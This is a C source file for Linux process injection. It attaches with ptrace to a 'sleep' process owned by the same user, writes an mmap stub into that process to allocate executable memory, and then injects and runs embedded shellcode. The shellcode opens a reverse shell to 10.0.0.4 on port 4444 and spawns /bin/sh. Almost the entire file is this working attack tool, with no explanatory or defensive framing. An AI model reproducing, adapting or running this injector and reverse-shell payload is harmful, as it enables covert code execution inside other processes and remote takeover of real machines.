#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <fcntl.h>
#include <errno.h>

#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>

#define MAXLEN 2048
#define PAGESIZE 4096

typedef struct mem_blk {
    unsigned long *start_addr;
    unsigned long *mapped_addr;
    int pg_size;
} MEMBLK, *PMEMBLK;

typedef struct proc_info {
    pid_t pid;
    char name[MAXLEN];
} PROCINFO, *PPROCINFO;

PPROCINFO listProcs();
int injectProc(PPROCINFO proc);
PMEMBLK getMemBlk(pid_t pid);
void writeData(pid_t pid, unsigned long *dest, unsigned long *src, size_t len);
void readData(pid_t pid, unsigned long *dest, unsigned long *src, size_t len);

unsigned char mmap_code[] =
"\x6a\x22\x41\x5a\x6a\xff\x41\x58\x45\x31\xc9"
"\x31\xff\x6a\x07\x5a\xbe\x01\x01\x01\x01"
"\x81\xf6\x01\x11\x01\x01\x6a\x09\x58\x0f\x05\xcc";

unsigned char shellcode[] = {
    0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 
    0x48, 0x97, 0x48, 0xb9, 0x02, 0x00, 0x11, 0x5c, 0x0a, 0x00, 0x00, 0x04, 
    0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0x6a, 0x2a, 0x58, 0x0f, 0x05, 
    0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x6a, 0x21, 0x58, 0x0f, 0x05, 0x75, 
    0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 
    0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 
    0x0f, 0x05
};

void writeData(pid_t pid, unsigned long *dest, unsigned long *src, size_t len) {
    for(size_t i = 0; i < len; i+= 8, dest++, src++) {
        if(ptrace(PTRACE_POKETEXT, pid, dest, *src) < 0) {
            if (kill(pid, 0) == 0) {
                continue;
            } else {
                _exit(-1);
            }
        }
    }
}

void readData(pid_t pid, unsigned long *dest, unsigned long *src, size_t len) {
    for(size_t i = 0; i < len; i += sizeof(unsigned long), dest++, src++) {
        *dest = (unsigned long) ptrace(PTRACE_PEEKTEXT, pid, src, NULL);
        if (*dest == -1 && errno != 0) {
            break;
        }
    }
}

PMEMBLK getMemBlk(pid_t pid) {
    char filename[MAXLEN];
    FILE *fp;
    unsigned char line[1024], perms[5];
    PMEMBLK memblk = (PMEMBLK) calloc(1, sizeof(MEMBLK));

    snprintf(filename, sizeof(filename), "/proc/%d/maps", pid);
    fp = fopen(filename, "r");
    if (fp == NULL) return NULL;

    while(fgets(line, sizeof(line), fp) != NULL) {
        sscanf(line, "%lx-%*lx %s %*s", &memblk->start_addr, perms);
        if(strstr(perms, "x")){ break; }
    }
    return memblk;
}

int injectProc(PPROCINFO proc) {
    pid_t pid = proc->pid;
    int status;
    struct user_regs_struct oldregs, regs;

    unsigned long *backup = (unsigned long *) calloc(1, sizeof(mmap_code));
    unsigned long *mapped_addr = NULL;

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) return 0;
    waitpid(pid, &status, WUNTRACED);

    ptrace(PTRACE_GETREGS, pid, NULL, &oldregs);
    PMEMBLK memblk = getMemBlk(pid);
    if(memblk == NULL) return 0;

    readData(pid, backup, memblk->start_addr, sizeof(mmap_code));
    writeData(pid, memblk->start_addr, (unsigned long *) mmap_code, sizeof(mmap_code));

    regs.rip = (unsigned long) memblk->start_addr;
    ptrace(PTRACE_SETREGS, pid, NULL, &regs);
    ptrace(PTRACE_CONT, pid, NULL, NULL);
    waitpid(pid, &status, WUNTRACED);

    if(WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) {
        ptrace(PTRACE_GETREGS, pid, NULL, &regs);
        if((long) regs.rax < 0) {
            writeData(pid, memblk->start_addr, (unsigned long *) backup, sizeof(mmap_code));
            ptrace(PTRACE_SETREGS, pid, NULL, &oldregs);
            ptrace(PTRACE_DETACH, pid, NULL, NULL);
            return 0;
        };

        memblk->mapped_addr = (unsigned long *) regs.rax;
        goto executeShellcode;
    }

executeShellcode:
    writeData(pid, memblk->mapped_addr, (unsigned long *) shellcode, sizeof(shellcode));
    memset(&regs, 0, sizeof(struct user_regs_struct));
    regs.rip = (unsigned long) memblk->mapped_addr;
    ptrace(PTRACE_SETREGS, pid, NULL, &regs);
    ptrace(PTRACE_CONT, pid, NULL, NULL);

    if (kill(pid, 0) == 0) {
        if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0 && errno != ESRCH) {
            perror("[!] ptrace() detach error");
        }
    }
    return 1;
}

PPROCINFO listProcs() {
    PPROCINFO head = NULL;
    DIR *dir = opendir("/proc");
    if(!dir) return NULL;

    struct dirent *e;
    while((e=readdir(dir)) != NULL) {
        if(!atoi(e->d_name) || e->d_type != DT_DIR) continue;

        char path[MAXLEN];
        snprintf(path, sizeof(path), "/proc/%s/status", e->d_name);
        char buffer[MAXLEN * 2];
        int fd = open(path, O_RDONLY);
        if (fd < 0) { close(fd); continue; }

        int readsz = read(fd, buffer, sizeof(buffer));
        if(readsz < 0) continue;
        char *needle = strstr(buffer, "Uid:");
        int uid = atoi(strtok(needle+strlen("Uid:"), "\t"));
        if(uid != getuid()) continue;

        memset(path, 0, sizeof(path)); memset(buffer, 0, sizeof(buffer)); close(fd);
        snprintf(path, sizeof(path), "/proc/%s/cmdline", e->d_name);

        fd = open(path, O_RDONLY);
        if(fd < 0){ close(fd); closedir(dir); return NULL; }

        readsz = read(fd, buffer, sizeof(buffer));
        if(readsz <= 0) continue;

        if(strstr(buffer, "sleep") == NULL) continue;
        PPROCINFO proc = (PPROCINFO) malloc(sizeof(PROCINFO));
        memset(proc, 0, sizeof(PROCINFO));
        if(proc == NULL) continue;

        proc->pid = atoi(e->d_name);
        strncpy(proc->name, buffer, MAXLEN);

        if(injectProc(proc) == 0) {
            free(proc); continue;
        }
        head = proc;
        break;
    }
    closedir(dir);
    return head;
}

int main(int argc, char **argv) {
    PPROCINFO proc = listProcs();
    return 0;
}
